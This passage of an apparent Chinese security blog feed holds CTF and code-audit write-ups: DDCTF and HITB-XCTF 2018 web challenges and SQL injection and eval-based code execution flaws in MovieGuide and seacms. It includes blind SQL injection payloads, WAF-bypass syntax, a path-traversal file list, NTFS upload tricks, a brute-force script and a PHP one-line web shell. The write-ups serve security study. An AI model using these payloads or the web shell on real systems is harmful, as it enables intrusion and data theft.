rel="noopener">http://www.herongyang.com/gb2312_gb/pinyin_32.html</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> suctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF 2018 web writeup</title>
      <link href="2018/04/21/ctf/ddctf-2018-web-writeup/"/>
      <url>2018/04/21/ctf/ddctf-2018-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="DDCTF-2018-2道WEB-Writeup"><a href="#DDCTF-2018-2道WEB-Writeup" class="headerlink" title="DDCTF 2018 2道WEB Writeup"></a>DDCTF 2018 2道WEB Writeup</h1><a id="more"></a><h2 id="WEB00-数据库的秘密"><a href="#WEB00-数据库的秘密" class="headerlink" title="WEB00 数据库的秘密"></a>WEB00 数据库的秘密</h2><h4 id="step-1"><a href="#step-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过</p><h4 id="step-2"><a href="#step-2" class="headerlink" title="step 2:"></a>step 2:</h4><p>绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payload<code>a%&#39; &amp;&amp; &#39;%&#39;=&#39;%</code>、<code>a%&#39; &amp;&amp; &#39;%&#39;!=&#39;%</code>确定注入存在,想着用union直接提取出来，发现后台还有WAF，没绕过去，但是对于盲注，成功构造出了payload<code>a%&#39;&amp;&amp;if(1, sleep (5),1)=&#39;%</code>,发生5秒延迟。（后来想想其实可以用bool型盲注提取数据）</p><h4 id="step-3"><a href="#step-3" class="headerlink" title="step 3:"></a>step 3:</h4><p>确认了author字段可以注入，但是这道题还有一个问题就是sha1校验，要想写脚本，必须先解决这个问题。研究了一下main.js，发现以类似<code>id=title=date=author=time=</code>的字符串sha1处理后后台校验</p><h4 id="step-4"><a href="#step-4" class="headerlink" title="step 4:"></a>step 4:</h4><p>写脚本，主要包括sha1校验和时间盲注，贴一下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload_1 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(schema_name) from information_schema.schemata limit &#123;0&#125;,1)=&#123;1&#125;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_2 = &quot;a%&apos; &amp;&amp; if((selEct substr(schema_name,&#123;0&#125;,1) from information_schema.schemata limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># 获取到库名 ddctf</span><br><span class="line">payload_3 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line">payload_4 = &quot;a%&apos; &amp;&amp; if((selEct substr(table_name,&#123;0&#125;,1) from information_schema.tables where table_schema=&apos;ddctf&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (5),1)=&apos;%&quot;</span><br><span class="line"># 获取到表名 message, ctf_key4</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(column_name) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(column_name,&#123;0&#125;,1) from information_schema.columns where table_schema=&apos;ddctf&apos;&amp;&amp;table_name=&apos;ctf_key4&apos; limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># 获取到列名 ctf_key4:secvalue; message: id,title,author,time,status</span><br><span class="line">payload_5 = &quot;a%&apos; &amp;&amp; if((selEct LENGTH(secvalue) from ctf_key4 limit &#123;0&#125;,1)=&apos;&#123;1&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line">payload_6 = &quot;a%&apos; &amp;&amp; if((selEct substr(secvalue,&#123;0&#125;,1) from ctf_key4 limit &#123;1&#125;,1)=&apos;&#123;2&#125;&apos;,sleep (10),1)=&apos;%&quot;</span><br><span class="line"># 获取到flag DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</span><br></pre></td></tr></table></figure><h2 id="WEB01-专属链接"><a href="#WEB01-专属链接" class="headerlink" title="WEB01 专属链接"></a>WEB01 专属链接</h2><h4 id="step-1-1"><a href="#step-1-1" class="headerlink" title="step 1:"></a>step 1:</h4><p>根据题目提示，题目只跟链接IP有关，所以主要有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://116.85.48.102:5050/welcom/uuid #主页 注意到上面有email:3814166715717836733@didichuxing.com</span><br><span class="line">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # 给了提示，只能下载.class,.ks,.ico,.xml文件</span><br><span class="line">http://116.85.48.102:5050/news/topFiveNews # 没用</span><br><span class="line">http://116.85.48.102:5050//flag/testflag/yourflag #访问报错，但是暴露了控制器路径com.didichuxing.ctf.controller.user.FlagController.java</span><br></pre></td></tr></table></figure></p><h4 id="step-2-1"><a href="#step-2-1" class="headerlink" title="step 2:"></a>step 2:</h4><p>那么接下来就是猜路径了，在github上找了个springmvc+mybatis的<a href="https://github.com/liyifeng1994/ssm" target="_blank" rel="noopener">项目</a>,经过测试，发现一下几个文件</p><ul><li>../../WEB-INF/web.xml # 得到WEB-INF/applicationContext.xml，com.didichuxing.ctf.listener.InitListener</li><li>../../WEB-INF/applicationContext.xml # 得到classpath:mybatis/config.xml</li><li>../../WEB-INF/classes/mybatis/config.xml # 得到mapper/FlagMapper.xml</li><li>../../WEB-INF/classes/mapper/FlagMapper.xml # sql语句</li><li>../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class</li><li>../../WEB-INF/classes/sdl.ks # 密钥文件</li><li>../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class</li><li>../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class</li></ul><h4 id="step-3-1"><a href="#step-3-1" class="headerlink" title="step 3:"></a>step 3:</h4><p>把上述的class文件<a href="http://www.javadecompilers.com/" target="_blank" rel="noopener">在线反编译</a>到java，阅读后发现flagController.java</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value=&#123;&quot;/getflag/&#123;email:[0-9a-zA-Z&apos;]+&#125;&quot;&#125;, method=&#123;org.springframework.web.bind.annotation.RequestMethod.POST&#125;)</span><br><span class="line">  public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model)</span><br><span class="line">  &#123;</span><br><span class="line">    Flag flag = flagService.getFlagByEmail(email);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return &quot;Encrypted flag : &quot; + flag.getFlag();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>以用户的邮箱来获取加密的flag，邮箱就是首页上的邮箱，然后通过listener.java得到具体的加密过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;</span><br><span class="line">String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);</span><br><span class="line"></span><br><span class="line">byte[] data = cipher.doFinal(flag.getBytes());</span><br><span class="line">byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class="line"></span><br><span class="line">Flag flago = new Flag();</span><br><span class="line">flago.setId(Integer.valueOf(id));</span><br><span class="line">flago.setFlag(byte2hex(data));</span><br><span class="line">flago.setEmail(byte2hex(e));</span><br><span class="line">flago.setOriginFlag(flag);</span><br><span class="line">flago.setUuid(uuid);</span><br><span class="line">flago.setOriginEmail(email);</span><br></pre></td></tr></table></figure><p>可以看到Email被转化为16进制的形式，所以需要先对邮箱做处理，简单编写代码（后面放上来），得到8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27，以<code>http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27</code>请求后得到加密的flag。</p><h4 id="step-4-1"><a href="#step-4-1" class="headerlink" title="step 4:"></a>step 4:</h4><p>接下来就是写代码解密flag了，因为密钥文件在手，只需编写程序即可，参考<a href="https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa" target="_blank" rel="noopener">https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&amp;utm_source=google_rich_qa&amp;utm_campaign=google_rich_qa</a><br>需要注意的是这里用了私钥加密公钥解密。<br>解密后得到flag</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ddctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HITB-XCTF 2018 web writeup</title>
      <link href="2018/04/15/ctf/hitb-xctf-2018-portion-web-writeup/"/>
      <url>2018/04/15/ctf/hitb-xctf-2018-portion-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><a id="more"></a><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>windows平台的一些特性</p><ul><li><p>windows平台特性<br>windows下搜索文件用到的是FindFirstFile，该函数执行时，会将<code>&quot;&lt;&quot; =&gt; &quot;*&quot;</code>、<code>&quot;&gt;&quot; =&gt; &quot;?&quot;</code>、<code>&quot; =&gt; .</code>，所以在应用中，我们可以使用这个特性。e.g.</p><pre><code>`?filename=a&gt;  =&gt;  a?` 匹配单个字符`?filename=a&lt;  =&gt;  a*` 匹配多个字符`?filename=a&quot;  =&gt;  a.`</code></pre></li><li><p>NTFS ADS特性</p></li></ul><table><thead><tr><th style="text-align:center">上传的文件名</th><th style="text-align:center">系统结果</th></tr></thead><tbody><tr><td style="text-align:center">test.php:a.jpg</td><td style="text-align:center">生成test.php，但是无内容</td></tr><tr><td style="text-align:center">test.php::$DATA</td><td style="text-align:center">生成test.php，有内容</td></tr><tr><td style="text-align:center">test.php::$INDEX_ALLOCATION</td><td style="text-align:center">生成test.php文件夹</td></tr><tr><td style="text-align:center">test.php::$DATA.jpg</td><td style="text-align:center">生成0.jpg，有内容</td></tr><tr><td style="text-align:center">test.php::$DATA\test.jpg</td><td style="text-align:center">生成aaa.jpg，有内容</td></tr></tbody></table><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul><li><p>step 1:<br>功能点#文件上传 #上传文件宽高 =&gt; getshell<br>环境：IIS7.0 Windows Server 2008 Standard Edition Service Pack 2</p></li><li><p>step 2:<br>文件上传功能黑名单php，文件名前缀时间戳重写，但截取上传文件名的最后一个后缀不变。简单利用ADS特性，上传test.php::$DATA</p></li><li><p>step 3:<br>上传了文件后，需要找到文件目录。pic.php返回了上传文件宽和高，猜测其使用了getimagesize，想到前段时间的一篇<a href="https://xianzhi.aliyun.com/forum/topic/2064" target="_blank" rel="noopener">帖子</a>，写个脚本跑该复杂目录</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># Created by wh1t3P1g at 2018/4/11</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">str=&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">ret=&quot;&quot;</span><br><span class="line">for i in range(32):</span><br><span class="line">    for c in str:</span><br><span class="line">        t=ret+c</span><br><span class="line">        url=&quot;http://47.90.97.18:9999/pic.php?filename=../&quot;+t+&quot;%3C/1523456340.jpg&quot;</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        if &quot;width&quot; in r.content:</span><br><span class="line">            ret+=c</span><br><span class="line">            print ret</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>得到目录87194f13726af7cee27ba2cfe97b60df</p><ul><li>step 4:<br>有了目录就能访问上传的一句话<code>&lt;?php eval($_POST[cmd]);?&gt;</code>，系统禁用了执行系统命令的一些函数，但是这里并不需要执行命令。<br>这里不截图了<br><code>cmd=var_dump(glob(&quot;../*&quot;));</code>得到flag.php，访问后发现需要读取flag.php的内容<br><code>cmd=echo readfile(&quot;../flag.php&quot;);</code>得到flag</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次就做了一道web，还有待提高和积累:)</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hitbxctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MovieGuide v2.0 SQLi</title>
      <link href="2018/02/03/php/MovieGuide2SQLi/"/>
      <url>2018/02/03/php/MovieGuide2SQLi/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>Detail: <a href="https://www.exploit-db.com/exploits/43346/" target="_blank" rel="noopener">Movie Guide v2.0 SQL Injection</a></p><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>这是一个比较粗糙的开源cms，总体来说并没有对输入输出做安全处理，从PoC入手，选一个还原一下漏洞形成过程。</p><h3 id="PoC：index-php-md-SQL"><a href="#PoC：index-php-md-SQL" class="headerlink" title="PoC：index.php?md=[SQL]"></a>PoC：index.php?md=[SQL]</h3><p>定位一下md参数<br>layout.php为该cms的主要入口处理,下述的变量均没有通过安全处理，直接SQL语句，从而都可以用于数据库注入。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Get the passed variables.</span></span><br><span class="line">$mterm = filter_input(INPUT_POST, <span class="string">'tterm'</span>);</span><br><span class="line">$cterm = filter_input(INPUT_POST, <span class="string">'gterm'</span>);</span><br><span class="line">$lterm = filter_input(INPUT_GET, <span class="string">'gterm'</span>);</span><br><span class="line">$yterm = filter_input(INPUT_GET, <span class="string">'year'</span>);</span><br><span class="line">$md = filter_input(INPUT_GET, <span class="string">'md'</span>);</span><br><span class="line">$actorname = filter_input(INPUT_GET, <span class="string">'actor'</span>);</span><br><span class="line">$directorname = filter_input(INPUT_GET, <span class="string">'director'</span>);</span><br></pre></td></tr></table></figure></p><p>直接拼接入SQL语句<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE &apos;&quot; . $md . &quot;&apos; ORDER BY `Movie_Title` ASC Limit $start, $perpage&quot;;</span><br></pre></td></tr></table></figure></p><p>这里比较有意思的是它的PoC，以前没有见过类似的:b，PoC中使用了export_set函数</p><h3 id="EXPORT-SET-bits-on-off-separator-number-of-bits"><a href="#EXPORT-SET-bits-on-off-separator-number-of-bits" class="headerlink" title="EXPORT_SET(bits,on,off[,separator[,number_of_bits]])"></a><code>EXPORT_SET(bits,on,off[,separator[,number_of_bits]])</code></h3><p><code>Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of −1 is effectively the same as 64.</code></p><p>分解一下PoC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/*!02222UNION*/</span><br><span class="line">(</span><br><span class="line">    /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239,</span><br><span class="line">        (</span><br><span class="line">            /*!02222Select*/</span><br><span class="line">                export_set(5,@a:=0,</span><br><span class="line">                (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data-&gt;@a</span><br><span class="line">                    export_set(5,</span><br><span class="line">                        export_set(5,@a,/*!02222table_name*/,&apos;&lt;li&gt;&apos;,2)//dump table_name [0&lt;li&gt;table_name]</span><br><span class="line">                    ,/*!02222column_name*/,&apos;\n:&apos;,2)//dump column_name [0&lt;li&gt;table_name\n:columns_name]</span><br><span class="line">                )</span><br><span class="line">            ,@a,2)//set @a split char</span><br><span class="line">        )</span><br><span class="line">    ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239</span><br><span class="line">    )-- -</span><br></pre></td></tr></table></figure></p><p>这里主要利用的是export_set函数的no，off位置来dump数据。</p><ul><li>首先通过@a:=0，定义变量a为0（可能跟mysql版本有关系，5.7.x下的mysql无法用@:=0来定义）</li><li>最里面的export_set，将table_name dump出来（结果为<code>0&lt;li&gt;table_name</code>）</li><li>接下来的一个export_set，将columns_name dump出来(结果为<code>0&lt;li&gt;table_name\n:columns_name</code>)</li><li><code>select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,&#39;&lt;li&gt;&#39;,2),column_name,&#39;\n:&#39;,2)</code>将上述的数据赋值给变量a</li><li>最后用最后一个export_set，用@a做分隔符，将数据dump出来</li></ul><h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>该cms的注入漏洞很常规，主要是学习分析了该PoC，能在未来注入绕过的地方应用。</p><ol><li>mysql的自定义变量@的应用，可以在一定程度上消除空格，以及正则<code>\bwhere\b</code>的绕过</li><li>/!02222select*/这个方法也是经常听说，也在这里用到了，一个很好的例子。</li><li>export_set的应用，比较重要的应用，在某些情况下可用于绕过</li></ol>]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seacms v6.5 前台getshell</title>
      <link href="2017/03/16/old-old-seacms-v6-5-getshell/"/>
      <url>2017/03/16/old-old-seacms-v6-5-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>前段时间放在<a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10291" target="_blank" rel="noopener">90sec</a>上的一篇代码审计，收拾一下放到自己博客上<br><a id="more"></a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>cms版本：6.45<br>直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">function parseIf($content)&#123;</span><br><span class="line">if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">return $content;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">$labelRule2=&quot;&#123;elseif&quot;;</span><br><span class="line">$labelRule3=&quot;&#123;else&#125;&quot;;</span><br><span class="line">preg_match_all($labelRule,$content,$iar);</span><br><span class="line">$arlen=count($iar[0]);</span><br><span class="line">$elseIfFlag=false;</span><br><span class="line">for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">$strIf=$iar[1][$m];</span><br><span class="line">$strIf=$this-&gt;parseStrIf($strIf);</span><br><span class="line">$strThen=$iar[2][$m];</span><br><span class="line">$strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">$elsearray=explode($labelRule3,$strThen);</span><br><span class="line">$strThen1=$elsearray[0];</span><br><span class="line">$strElse1=$elsearray[1];</span><br><span class="line">                    echo &quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;;</span><br><span class="line">                    eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$elseIfArray=explode($labelRule2,$strThen);</span><br><span class="line">$elseIfArrayLen=count($elseIfArray);</span><br><span class="line">$elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);</span><br><span class="line">$resultStr=$elseIfSubArray[1];</span><br><span class="line">$elseIfArraystr0=addslashes($elseIfArray[0]);</span><br><span class="line">@eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);</span><br><span class="line">for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;</span><br><span class="line">$strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIf=$this-&gt;parseStrIf($strElseIf);</span><br><span class="line">$strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);</span><br><span class="line">if ($elseIfFlag) &#123;break;&#125;</span><br><span class="line">&#125;</span><br><span class="line">$strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">$strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0);</span><br><span class="line">@eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);</span><br><span class="line">$content=str_replace($iar[0][$m],$resultStr,$content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面主要逻辑为解析html文件中的{if:}{end if}标签代码，可以看到没有做任何处理就eval，那么我们查找一下对应调用的地方会不会有漏洞。<br>主要关注前台，找到一处解析搜索结果的页面（search.php），代码比较多，一点一点来看。<br>找到调用的位置line 212<code>$content=$mainClassObj-&gt;parseIf($content);</code><br>往上看，发现他的逻辑是先解析其他类型的标签，比如<code>{searchpage:page}</code><br>那么接下来的思路，主要是2点，查找对应if标签可控的位置，另一种就是查找其他标签的可控内容，写入if标签<br>我找到一处其他标签可控且没有做任何处理的位置，直接写入if标签语句即可造成任意代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function echoSearchPage()</span><br><span class="line">&#123;</span><br><span class="line">        global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;</span><br><span class="line">        $order = !empty($order)?$order:time;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>order变量可控并且在调用parseIf函数前先解析，所以我们可以通过order写入if标签。<br>查看一下具体html代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;btn-group&quot;&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;最新上映&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;最近热播&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;评分最高&lt;/a&gt;</span><br><span 